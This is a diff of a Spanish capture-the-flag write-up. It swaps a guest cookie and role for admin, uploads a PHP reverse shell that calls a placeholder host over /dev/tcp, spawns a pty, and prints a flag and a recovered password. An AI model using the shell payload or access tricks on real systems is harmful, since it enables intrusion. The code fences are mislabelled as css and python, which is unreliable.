@@ -141,17 +141,17 @@ Info:
 	--:Ahora vamos a la pagia e intentamos entrat en Uploads
 ```
 
-##### Notamos que la pagina se queda cargando asi que hemos interceptado la peticion correctamente. 
-##### ahora Cambiamos la Cookie del Usuario guest por la cookie del usuario admin y el #role del usuario guest por admin: 
+###### Notamos que la pagina se queda cargando asi que hemos interceptado la peticion correctamente. 
+###### ahora Cambiamos la Cookie del Usuario guest por la cookie del usuario admin y el #role del usuario guest por admin: 
 
 
 ![[2023-10-06_14-51.png]]
 
-##### Precionamos el boton #Forward para que la peticion con la modificacion que acabamos de hacer se envie y verificamos en la pagina.
+###### Precionamos el boton #Forward para que la peticion con la modificacion que acabamos de hacer se envie y verificamos en la pagina.
 
 ![[2023-10-06_14-56.png]]
 
-##### Podemos ver que ahora tenemos acceso a la pestana de Uploads. parace que podemos subir archivos a esta pagina. asi que intentaremos subir un archivo malisioso para intentar consegir una reverseShell
+###### Podemos ver que ahora tenemos acceso a la pestana de Uploads. parace que podemos subir archivos a esta pagina. asi que intentaremos subir un archivo malisioso para intentar consegir una reverseShell
 
 buscamos en internet una reverseshell.php
 
@@ -451,29 +451,29 @@ function printit ($string) {
 ```
 
 # Rshell.php
-```css
+```python
 <?php
     system("bash -c 'bash -i >& /dev/tcp/TUI-P/PUERTO 0>&1'")
 ?>
 ```
 
 
-##### Tenemos que cambiar el la IP y el puerto por donde estaremos escuchando para conseguir la reverseshell.php
+###### Tenemos que cambiar el la IP y el puerto por donde estaremos escuchando para conseguir la reverseshell.php
 
 comando para generar el pront de la terminal
-```css
+```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 
 User.txt
-```css
+```python
 f2c74ee8db7983851ab2a96a44eb7981
 ```
 
 #### Navegando al directorio donde se alija la pagina php podemos encontrar archivos interesantes.
 User.
-```css
+```python
 'robert', 'M3g4C0rpUs3r!'
 ```
 
